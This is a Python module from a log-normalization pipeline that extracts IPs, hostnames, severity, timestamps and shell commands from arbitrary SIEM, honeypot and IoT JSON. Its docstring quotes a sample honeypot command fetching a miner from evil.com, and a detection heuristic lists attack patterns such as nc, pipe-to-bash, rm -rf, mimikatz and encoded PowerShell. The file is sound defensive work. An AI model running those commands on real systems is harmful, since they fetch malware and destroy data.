"""
normalizer/semantic_extractor.py
=================================
Responsabilidad ÚNICA: extraer campos canónicos de CUALQUIER JSON,
sin importar el nombre de las llaves ni la profundidad del objeto.

Estrategia:
  En lugar de buscar llaves específicas ("host", "hostname"...),
  el extractor recorre el objeto completo buscando VALORES que
  parezcan lo que buscamos, según su forma y contenido.

  Concepto → lo que buscamos en los valores
  ─────────────────────────────────────────
  src_ip      → string con forma X.X.X.X
  asset_id    → string que parece hostname/id de máquina
  severity    → número 0-15 ó string (high/medium/critical)
  timestamp   → string ISO-8601 ó número epoch
  command     → string con comandos de shell/sistema
  event_name  → string corto que describe una acción

  Esto permite que funcione con:
  - Honeypot: {"input": "wget http://evil.com/miner"} → command
  - IoT:      {"val": 130.2, "topic": "boiler/temp"}  → numeric_value
  - M365:     AuditData ya desempaquetado por sanitizer
  - Cualquier SIEM futuro desconocido

parse_confidence indica cuántos campos canónicos se encontraron (0.0–1.0).
Si parse_confidence < 0.4 el downstream puede decidir ser más conservador.
"""

import re
import logging
from typing import Any

logger = logging.getLogger(__name__)

# Expresión regular para IPv4
_RE_IPV4 = re.compile(r'\b(\d{1,3}\.){3}\d{1,3}\b')

# Palabras que indican un nombre de activo/host
_HOST_HINTS = {
    'name', 'host', 'hostname', 'computer', 'device', 'asset',
    'agent', 'node', 'endpoint', 'logsource', 'machine', 'server',
    'sensor', 'computername', 'devicename', 'clientname', 'workstation',
    'logSource', 'LogSource', 'd_id', 'aid', 'system',
}

# Palabras que indican severidad
_SEVERITY_HINTS = {
    'level', 'severity', 'urgency', 'priority', 'magnitude',
    'risk', 'criticality', 'sev', 'Severity', 'SeverityName',
    'Magnitude',
}

# Palabras que indican timestamp
_TIME_HINTS = {
    'time', 'timestamp', 'date', 'created', 'occurred', 'when',
    '@timestamp', '_time', 'eventtime', 'StartTime', 'occurredAt',
    'CreationTime', 't',
}

# Palabras que indican un comando ejecutado
_COMMAND_HINTS = {
    'command', 'commandline', 'cmd', 'input', 'cmdline',
    'CommandLine', 'process_cmdline', 'exec',
}

# Palabras que indican nombre del evento
_EVENT_HINTS = {
    'event', 'eventname', 'operation', 'action', 'verb',
    'type', 'eventtype', 'name', 'description', 'msg', 'message',
    'EventName', 'Operation', 'Objective', 'Technique',
}

# Palabras que indican IP de origen
_SRCIP_HINTS = {
    'src', 'source', 'srcip', 'src_ip', 'sourceip', 'clientip',
    'remoteip', 'remote_addr', 'ipaddress', 'ipAddress', 'clientIp',
    'SourceIp', 'sourceIPAddress', 'ip',
}

# Palabras que indican un valor numérico de sensor/métrica
_NUMERIC_HINTS = {
    'val', 'value', 'reading', 'measurement', 'metric', 'count',
    'bytes', 'magnitude',
}


# ── Punto de entrada ──────────────────────────────────────────────────────────

def extract(obj: Any) -> dict:
    """
    Recorre el objeto JSON completo (sin importar profundidad) y retorna
    un diccionario con los campos canónicos encontrados más parse_confidence.
    """
    collector = _Collector()
    collector.walk(obj, key_hint="", depth=0)
    return collector.result()


# ── Motor de extracción ───────────────────────────────────────────────────────

class _Collector:
    """
    Acumula evidencia a medida que recorre el objeto.
    Cada campo canónico acepta múltiples candidatos y elige el mejor.
    """

    def __init__(self):
        self._src_ip_candidates   : list[tuple[float, str]] = []
        self._asset_candidates    : list[tuple[float, str]] = []
        self._severity_candidates : list[tuple[float, Any]] = []
        self._timestamp_candidates: list[tuple[float, Any]] = []
        self._command_candidates  : list[tuple[float, str]] = []
        self._event_candidates    : list[tuple[float, str]] = []
        self._numeric_candidates  : list[tuple[float, float]] = []
        self._all_text            : list[str] = []   # para búsqueda de IPs flotantes

    def walk(self, obj: Any, key_hint: str, depth: int) -> None:
        """Recorre recursivamente el objeto acumulando candidatos."""
        if depth > 8:
            return

        key_lower = key_hint.lower()

        if isinstance(obj, dict):
            for k, v in obj.items():
                self.walk(v, key_hint=k, depth=depth + 1)

        elif isinstance(obj, list):
            for item in obj:
                self.walk(item, key_hint=key_hint, depth=depth + 1)

        elif isinstance(obj, str):
            self._all_text.append(obj)
            self._evaluate_string(obj, key_lower)

        elif isinstance(obj, (int, float)):
            self._evaluate_number(obj, key_lower)

    def _evaluate_string(self, value: str, key: str) -> None:
        # ¿Parece una IP?
        ip_match = _RE_IPV4.search(value)
        if ip_match:
            ip = ip_match.group(0)
            score = 1.0 if key in _SRCIP_HINTS else 0.5
            self._src_ip_candidates.append((score, ip))

        # ¿Parece un hostname/asset?
        if key in _HOST_HINTS and len(value) > 1:
            score = 1.0 if key in {'host', 'hostname', 'computername', 'ComputerName'} else 0.7
            # Preferir nombres que parezcan hostnames (guiones, sin espacios)
            if re.match(r'^[\w\-\.]+$', value) and len(value) < 100:
                self._asset_candidates.append((score, value))

        # ¿Parece severidad en texto?
        if key in _SEVERITY_HINTS:
            lower = value.lower()
            sev_map = {'critical': 1.0, 'high': 0.8, 'medium': 0.5,
                       'low': 0.2, 'info': 0.1, 'informational': 0.1}
            if lower in sev_map:
                self._severity_candidates.append((1.0, sev_map[lower]))

        # ¿Parece timestamp?
        if key in _TIME_HINTS:
            # ISO-8601 o formato compacto 14 dígitos
            if re.match(r'\d{4}-\d{2}-\d{2}', value) or (len(value) == 14 and value.isdigit()):
                self._timestamp_candidates.append((1.0, value))

        # ¿Parece un comando shell?
        if key in _COMMAND_HINTS and len(value) > 2:
            self._command_candidates.append((1.0, value))
        # También detectar strings que parecen comandos por su contenido
        elif _looks_like_command(value):
            self._command_candidates.append((0.6, value))

        # ¿Parece un nombre de evento?
        if key in _EVENT_HINTS and 2 < len(value) < 200:
            self._event_candidates.append((1.0, value))

    def _evaluate_number(self, value: float, key: str) -> None:
        # ¿Parece severidad numérica?
        if key in _SEVERITY_HINTS:
            if 0 <= value <= 15:
                # Normalizar: Wazuh (0-15), QRadar Magnitude (1-10), CS (1-5)
                normalized = min(value / 15.0, 1.0)
                self._severity_candidates.append((1.0, normalized))

        # ¿Parece timestamp epoch?
        if key in _TIME_HINTS:
            if 1_000_000_000 <= value <= 9_999_999_999_999:
                self._timestamp_candidates.append((1.0, value))

        # ¿Parece un valor numérico de sensor?
        if key in _NUMERIC_HINTS:
            self._numeric_candidates.append((1.0, float(value)))

        # Magnitud QRadar (sin pista de llave)
        if key == 'magnitude' or key == 'Magnitude':
            normalized = min(float(value) / 10.0, 1.0)
            self._severity_candidates.append((1.0, normalized))

    def result(self) -> dict:
        """Construye el resultado eligiendo el candidato de mayor score por campo."""

        src_ip    = _best(self._src_ip_candidates)
        asset_id  = _best(self._asset_candidates)
        severity  = _best(self._severity_candidates)
        timestamp = _best(self._timestamp_candidates)
        command   = _best(self._command_candidates)
        event     = _best(self._event_candidates)
        numeric   = _best(self._numeric_candidates)

        # Si no encontramos IP por pista de llave, buscar en todos los strings
        if src_ip is None:
            for text in self._all_text:
                m = _RE_IPV4.search(text)
                if m:
                    src_ip = m.group(0)
                    break

        # Calcular parse_confidence: proporción de campos canónicos encontrados
        found = sum(1 for v in [src_ip, asset_id, severity, timestamp, event]
                    if v is not None)
        confidence = round(found / 5.0, 2)

        return {
            "src_ip":          src_ip,
            "asset_id":        asset_id or "unknown",
            "severity_score":  float(severity) if severity is not None else 0.2,
            "timestamp_raw":   timestamp,
            "command":         command,
            "event_name":      event,
            "numeric_value":   numeric,   # para IoT: la temperatura, presión, etc.
            "parse_confidence": confidence,
        }


# ── Helpers ───────────────────────────────────────────────────────────────────

def _best(candidates: list[tuple[float, Any]]) -> Any:
    """Devuelve el valor con mayor score, o None si no hay candidatos."""
    if not candidates:
        return None
    return max(candidates, key=lambda x: x[0])[1]


def _looks_like_command(s: str) -> bool:
    """Heurística: ¿parece este string un comando de shell?"""
    command_patterns = [
        r'^\s*(wget|curl|chmod|bash|sh|python|powershell|cmd|nc|ncat)\b',
        r'\|\s*(bash|sh|/bin)',
        r'(rm\s+-rf|vssadmin|mimikatz|miner|/tmp/\.\w)',
        r'(-[eE]nc\s+[A-Za-z0-9+/=]{10,})',   # base64 powershell
        r'(pty\.spawn|subprocess\.call)',
    ]
    for pat in command_patterns:
        if re.search(pat, s, re.IGNORECASE):
            return True
    return False
